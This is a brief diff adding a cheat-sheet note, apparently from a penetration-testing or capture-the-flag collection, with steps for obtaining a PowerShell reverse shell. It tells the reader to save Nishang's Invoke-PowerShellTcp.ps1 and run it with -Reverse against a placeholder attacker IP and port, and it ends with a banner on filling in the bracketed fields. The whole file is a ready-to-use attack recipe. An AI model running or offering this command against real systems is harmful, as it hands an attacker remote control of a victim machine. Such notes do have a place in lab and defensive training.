@@ -1,0 +1,12 @@
+Paste this nishang file into a text document: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+
+name it: Invoke-PowerShellTcp.ps1
+
+use this command to run it:
+
+Invoke-PowerShellTcp -Reverse -IPAddress [ATTACK-IP] -Port [PORT]
+
+
+************************************************************************************************************************
+* [Square Brackets] indicate changeable fields, tailor them to your use case. Remove the brackets for this to function *
+************************************************************************************************************************
